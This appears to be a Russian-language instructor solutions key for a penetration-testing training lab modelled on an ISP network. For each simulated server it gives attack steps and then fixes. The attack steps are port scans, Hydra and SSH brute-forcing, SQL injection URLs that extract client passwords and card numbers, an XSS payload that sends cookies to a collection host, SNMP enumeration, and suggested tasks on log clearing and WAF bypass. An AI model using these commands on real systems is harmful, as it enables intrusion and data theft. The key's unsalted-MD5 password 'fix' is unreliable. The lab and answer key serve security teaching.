# Решения для преподавателей

⚠️ **ВНИМАНИЕ**: Этот документ предназначен только для преподавателей! Не предоставляйте студентам доступ к этому файлу.

## Общие замечания

Данный документ содержит решения и правильные ответы для всех заданий в сценарии ISP компании. Используйте его для проверки работ студентов и подготовки подсказок.

---

## Решение 1: RADIUS сервер (192.168.10.10)

### Обнаружение уязвимостей

#### 1.1 Сканирование портов

**Правильный ответ**:
```bash
nmap -sS -p- 192.168.10.10
```

**Ожидаемый результат**:
- Порт 1812 (UDP) - RADIUS authentication
- Порт 1813 (UDP) - RADIUS accounting
- Порт 3306 (TCP) - MySQL

#### 1.2 Определение версии FreeRADIUS

**Правильный ответ**:
```bash
# Через подключение к серверу
ssh platform-admin@192.168.10.10
freeradius -v

# Или через анализ ответов RADIUS
radtest test test 192.168.10.10 0 testing123
```

**Ожидаемый результат**: FreeRADIUS 3.0.x

#### 1.3 Обнаружение MySQL

**Правильный ответ**:
```bash
nmap -sV -p 3306 192.168.10.10
```

**Ожидаемый результат**: MySQL 5.7.x

#### 1.4 Тестирование подключения к MySQL

**Правильный ответ**:
```bash
mysql -h 192.168.10.10 -u radius -p
# Пароль: radius123
```

#### 1.5 Обнаружение слабого пароля

**Правильный ответ**:
- Брутфорс с помощью Hydra:
```bash
hydra -l radius -P /usr/share/wordlists/rockyou.txt mysql://192.168.10.10
```

- Или использование словаря с простыми паролями:
```bash
hydra -l radius -P passwords.txt mysql://192.168.10.10
```

**Ожидаемый пароль**: `radius123`

#### 1.6 Анализ конфигурации FreeRADIUS

**Правильный ответ**:
```bash
ssh platform-admin@192.168.10.10
cat /etc/freeradius/3.0/sites-available/default
cat /etc/freeradius/3.0/clients.conf
```

**Найденные проблемы**:
- Слабые shared secrets
- Отсутствие rate limiting
- Небезопасные методы аутентификации

### Эксплуатация уязвимостей

#### 2.1 Подключение к MySQL

**Правильный ответ**:
```bash
mysql -h 192.168.10.10 -u radius -pradius123
```

#### 2.2 Перечисление баз данных

**Правильный ответ**:
```sql
SHOW DATABASES;
```

**Ожидаемый результат**: База данных `radius`

#### 2.3 Перечисление таблиц

**Правильный ответ**:
```sql
USE radius;
SHOW TABLES;
```

**Ожидаемые таблицы**:
- `radcheck` - учетные данные клиентов
- `radreply` - атрибуты ответов
- `radacct` - учетные записи

#### 2.4 Извлечение учетных данных клиентов

**Правильный ответ**:
```sql
SELECT * FROM radcheck;
```

**Ожидаемый результат**: Список клиентов с логинами и паролями

#### 2.5 Анализ структуры данных

**Правильный ответ**:
```sql
DESCRIBE radcheck;
SELECT * FROM radcheck LIMIT 5;
```

### Устранение уязвимостей

#### 3.1 Изменение пароля MySQL

**Правильный ответ**:
```sql
ALTER USER 'radius'@'%' IDENTIFIED BY 'StrongPassword123!';
FLUSH PRIVILEGES;
```

#### 3.2 Ограничение доступа к MySQL

**Правильный ответ**:
```bash
# Редактирование /etc/mysql/mysql.conf.d/mysqld.cnf
bind-address = 127.0.0.1

# Перезапуск MySQL
systemctl restart mysql
```

#### 3.3 Шифрование паролей клиентов

**Правильный ответ**:
```sql
-- Обновление паролей с использованием MD5 или другого хеша
UPDATE radcheck SET value = MD5(value) WHERE attribute = 'Cleartext-Password';
```

#### 3.4 Исправление конфигурации FreeRADIUS

**Правильный ответ**:
```bash
# Редактирование /etc/freeradius/3.0/clients.conf
# Изменение shared secrets на сложные
# Добавление rate limiting
```

#### 3.5 Настройка rate limiting

**Правильный ответ**:
```bash
# В конфигурации FreeRADIUS добавить:
limit {
    max_connections = 16
    lifetime = 0
    idle_timeout = 30
}
```

---

## Решение 2: Биллинговый сервер (192.168.20.10)

### Обнаружение уязвимостей

#### 1.1 Сканирование веб-приложения

**Правильный ответ**:
```bash
nmap -sS -p 80,443,5432 192.168.20.10
```

#### 1.2 Определение технологий

**Правильный ответ**:
```bash
# Анализ заголовков HTTP
curl -I http://192.168.20.10

# Определение версии Apache
curl -s http://192.168.20.10 | grep -i server

# Определение версии PHP
curl -s "http://192.168.20.10/index.php" | grep -i php
```

#### 1.3 Перечисление страниц

**Правильный ответ**:
```bash
# Использование dirb или dirbuster
dirb http://192.168.20.10

# Или вручную
curl http://192.168.20.10
curl http://192.168.20.10/login.php
curl http://192.168.20.10/search.php
```

#### 1.4 Обнаружение форм ввода

**Правильный ответ**:
- Анализ HTML кода страниц
- Поиск форм с параметрами (GET/POST)
- Найденные параметры: `id`, `user_id`, `search`, `query`

#### 1.5 Тестирование на SQL инъекции

**Правильный ответ**:
```bash
# Тестирование параметра id
curl "http://192.168.20.10/user.php?id=1'"
curl "http://192.168.20.10/user.php?id=1' OR '1'='1"
curl "http://192.168.20.10/user.php?id=1' UNION SELECT NULL--"
```

**Ожидаемый результат**: Ошибки SQL или неожиданные результаты

#### 1.6 Определение типа SQL инъекции

**Правильный ответ**:
- Error-based (ошибки в ответе)
- Union-based (можно использовать UNION)
- Time-based (можно использовать SLEEP)

### Эксплуатация уязвимостей

#### 2.1 Определение количества столбцов

**Правильный ответ**:
```sql
-- Метод ORDER BY
http://192.168.20.10/user.php?id=1 ORDER BY 1--
http://192.168.20.10/user.php?id=1 ORDER BY 2--
-- ... до ошибки

-- Метод UNION
http://192.168.20.10/user.php?id=1 UNION SELECT NULL--
http://192.168.20.10/user.php?id=1 UNION SELECT NULL,NULL--
```

#### 2.2 Определение версии БД

**Правильный ответ**:
```sql
http://192.168.20.10/user.php?id=1 UNION SELECT NULL,version(),NULL--
```

**Ожидаемый результат**: PostgreSQL 12.x

#### 2.3 Перечисление баз данных

**Правильный ответ**:
```sql
http://192.168.20.10/user.php?id=1 UNION SELECT NULL,datname,NULL FROM pg_database--
```

#### 2.4 Перечисление таблиц

**Правильный ответ**:
```sql
http://192.168.20.10/user.php?id=1 UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--
```

**Ожидаемые таблицы**:
- `clients` - данные клиентов
- `payments` - платежи
- `invoices` - счета

#### 2.5 Извлечение данных клиентов

**Правильный ответ**:
```sql
http://192.168.20.10/user.php?id=1 UNION SELECT NULL,username,password FROM clients--
```

#### 2.6 Извлечение платежной информации

**Правильный ответ**:
```sql
http://192.168.20.10/user.php?id=1 UNION SELECT NULL,card_number,amount FROM payments--
```

### Устранение уязвимостей

#### 3.1 Исправление SQL инъекций

**Правильный ответ**:
```php
// НЕПРАВИЛЬНО (уязвимый код):
$query = "SELECT * FROM clients WHERE id = " . $_GET['id'];

// ПРАВИЛЬНО (использование prepared statements):
$stmt = $pdo->prepare("SELECT * FROM clients WHERE id = ?");
$stmt->execute([$_GET['id']]);
$result = $stmt->fetchAll();
```

#### 3.2 Валидация входных данных

**Правильный ответ**:
```php
// Валидация ID
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false || $id < 1) {
    die("Invalid ID");
}
```

#### 3.3 Изменение пароля БД

**Правильный ответ**:
```sql
ALTER USER billing_user WITH PASSWORD 'StrongPassword123!';
```

---

## Решение 3: Веб-сервер (192.168.20.20)

### Обнаружение уязвимостей

#### 1.1 Определение версии WordPress

**Правильный ответ**:
```bash
# Анализ страницы
curl -s http://192.168.20.20 | grep -i "wp-content"
curl -s http://192.168.20.20/readme.html

# Или через wpscan
wpscan --url http://192.168.20.20 --enumerate v
```

**Ожидаемый результат**: WordPress 5.8

#### 1.2 Перечисление плагинов

**Правильный ответ**:
```bash
wpscan --url http://192.168.20.20 --enumerate p
```

#### 1.3 Обнаружение XSS уязвимостей

**Правильный ответ**:
```bash
# Тестирование форм
# Поиск параметров, которые отображаются на странице
curl "http://192.168.20.20/search.php?q=<script>alert(1)</script>"
```

#### 1.4 Обнаружение SQL инъекций

**Правильный ответ**:
```bash
# Тестирование параметров WordPress
sqlmap -u "http://192.168.20.20/?p=1" --dbs
```

### Эксплуатация уязвимостей

#### 2.1 Эксплуатация XSS

**Правильный ответ**:
```javascript
// Payload для кражи cookies
<script>
document.location='http://192.168.50.10/steal.php?cookie='+document.cookie
</script>
```

#### 2.2 Кража сессий

**Правильный ответ**:
- Создать сервер для получения cookies
- Отправить XSS payload
- Получить cookies администратора
- Использовать cookies для доступа

#### 2.3 Доступ к админ-панели

**Правильный ответ**:
```bash
# Использование украденных cookies
curl -H "Cookie: wordpress_logged_in_xxx=..." http://192.168.20.20/wp-admin/

# Или брутфорс
wpscan --url http://192.168.20.20 --usernames admin --passwords passwords.txt
```

### Устранение уязвимостей

#### 3.1 Обновление WordPress

**Правильный ответ**:
```bash
# В админ-панели WordPress
# Dashboard → Updates → Update Now

# Или через WP-CLI
wp core update
```

#### 3.2 Исправление XSS

**Правильный ответ**:
```php
// Экранирование вывода
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

---

## Решение 4: Сервер мониторинга (192.168.30.10)

### Обнаружение уязвимостей

#### 1.1 Сканирование портов

**Правильный ответ**:
```bash
nmap -sU -p 161 192.168.30.10
```

#### 1.2 Тестирование SNMP

**Правильный ответ**:
```bash
# Тестирование публичного community string
snmpwalk -v 2c -c public 192.168.30.10

# Тестирование приватного community string
snmpwalk -v 2c -c private 192.168.30.10
```

**Ожидаемые community strings**: `public`, `private`

#### 1.3 Получение информации через SNMP

**Правильный ответ**:
```bash
# Системная информация
snmpwalk -v 2c -c public 192.168.30.10 system

# Сетевая информация
snmpwalk -v 2c -c public 192.168.30.10 interfaces
```

### Эксплуатация уязвимостей

#### 2.1 Получение системной информации

**Правильный ответ**:
```bash
snmpget -v 2c -c public 192.168.30.10 sysDescr.0
snmpget -v 2c -c public 192.168.30.10 sysName.0
```

#### 2.2 Доступ к Zabbix

**Правильный ответ**:
```bash
# Обнаружение Zabbix
curl http://192.168.30.10

# Попытка доступа без аутентификации
curl http://192.168.30.10/zabbix/
```

### Устранение уязвимостей

#### 3.1 Изменение SNMP community strings

**Правильный ответ**:
```bash
# Редактирование /etc/snmp/snmpd.conf
rocommunity ComplexCommunityString123 127.0.0.1
```

#### 3.2 Ограничение доступа SNMP

**Правильный ответ**:
```bash
# В /etc/snmp/snmpd.conf
rocommunity ComplexCommunityString123 192.168.30.0/24
```

---

## Решение 5: Jump-сервер (192.168.30.20)

### Обнаружение уязвимостей

#### 1.1 Определение методов аутентификации

**Правильный ответ**:
```bash
# Анализ SSH конфигурации
ssh -v admin@192.168.30.20

# Или через сканирование
nmap --script ssh-auth-methods 192.168.30.20
```

#### 1.2 Брутфорс паролей

**Правильный ответ**:
```bash
# Использование Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.30.20

# Или Medusa
medusa -h 192.168.30.20 -u admin -P passwords.txt -M ssh
```

**Ожидаемые пароли**: `admin123`, `password`, `123456`

### Эксплуатация уязвимостей

#### 2.1 Подключение по SSH

**Правильный ответ**:
```bash
ssh admin@192.168.30.20
# Ввести найденный пароль
```

### Устранение уязвимостей

#### 3.1 Отключение парольной аутентификации

**Правильный ответ**:
```bash
# Редактирование /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes

# Перезапуск SSH
systemctl restart sshd
```

#### 3.2 Настройка защиты от брутфорса

**Правильный ответ**:
```bash
# Установка fail2ban
apt install fail2ban

# Настройка /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
bantime = 3600
```

---

## Критерии оценки для преподавателя

### Шкала оценки

| Процент выполнения | Оценка | Описание |
|---------------------|--------|----------|
| 90-100% | 5 (Отлично) | Все задачи выполнены, есть дополнительные находки |
| 75-89% | 4 (Хорошо) | Большинство задач выполнено, небольшие ошибки |
| 60-74% | 3 (Удовлетворительно) | Основные задачи выполнены, есть существенные ошибки |
| < 60% | 2 (Неудовлетворительно) | Большинство задач не выполнено |

### Типичные ошибки студентов

1. **Неполное сканирование**: Пропуск важных портов или сервисов
2. **Неправильное использование инструментов**: Неправильные параметры команд
3. **Неполное устранение**: Устранение только части уязвимостей
4. **Отсутствие валидации**: Не проверяют, что исправления работают
5. **Плохая документация**: Неполные отчеты без доказательств

### Дополнительные баллы

Поощряйте студентов за:
- Использование нестандартных методов
- Обнаружение дополнительных уязвимостей
- Качественную документацию
- Творческий подход к решению задач

---

## Подсказки для студентов (по запросу)

### Подсказка 1: RADIUS сервер

**Уровень 1 (легкая подсказка)**:
"Проверьте, какие порты открыты на сервере. Обратите внимание на порт базы данных."

**Уровень 2 (средняя подсказка)**:
"Попробуйте подключиться к базе данных. Пароль может быть простым."

**Уровень 3 (сильная подсказка)**:
"Пароль базы данных: radius123. Подключитесь и извлеките данные из таблицы radcheck."

### Подсказка 2: Биллинговый сервер

**Уровень 1**:
"Проанализируйте веб-приложение. Обратите внимание на параметры в URL."

**Уровень 2**:
"Попробуйте добавить кавычку в параметр id и посмотрите на ошибку."

**Уровень 3**:
"Используйте UNION SELECT для извлечения данных. Количество столбцов можно определить через ORDER BY."

---

## Дополнительные задания для продвинутых студентов

1. **Автоматизация**: Создание скрипта для автоматического сканирования
2. **Эксплойты**: Создание собственных эксплойтов
3. **Обход защиты**: Обход WAF или других систем защиты
4. **Сокрытие следов**: Очистка логов и сокрытие активности

---

**Примечание**: Этот документ должен храниться в секрете от студентов. Используйте его только для проверки работ и подготовки подсказок.

---

## Навигация

- **[← Назад к главной](../../README.md)** - главная страница с навигацией
- **[Чек-листы](CHECKLISTS.md)** - критерии оценки работ
- **[Шаблон отчета](REPORT_TEMPLATE.md)** - шаблон для составления отчета
- **[Обзор сценария](../overview/README.md)** - описание организации и сети

